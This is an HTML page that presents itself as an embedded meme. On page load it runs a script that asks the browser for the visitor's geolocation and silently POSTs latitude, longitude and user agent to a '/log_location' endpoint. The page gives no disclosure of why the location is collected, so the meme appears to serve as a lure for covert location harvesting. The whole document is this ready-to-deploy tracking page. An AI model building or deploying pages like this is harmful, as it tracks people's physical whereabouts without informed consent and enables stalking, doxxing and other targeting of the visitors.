<!DOCTYPE html>
<html>
<body onload="getLocation()">
  <iframe src="https://memes.com/m/d7WPlVGwGRk/embed"
    style="background:#fff;border:0;margin:1px;max-width:calc(100% - 2px);min-width:330px;padding:0;width:99.375%;"
    frameborder="0" scrolling="no"></iframe>
  <script async src="//cdn.memes.com/assets/embed.js"></script>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      } else {
        console.log("Geolocation not supported.");
      }
    }

    function showPosition(position) {
      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        user_agent: navigator.userAgent
      };

      fetch("/log_location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      })
      .then(res => res.json())
      .then(data => console.log("Location sent:", data))
      .catch(err => console.error("Error sending location:", err));
    }

    function showError(error) {
      console.error("Geolocation error:", error.message);
    }
  </script>
</body>
</html>
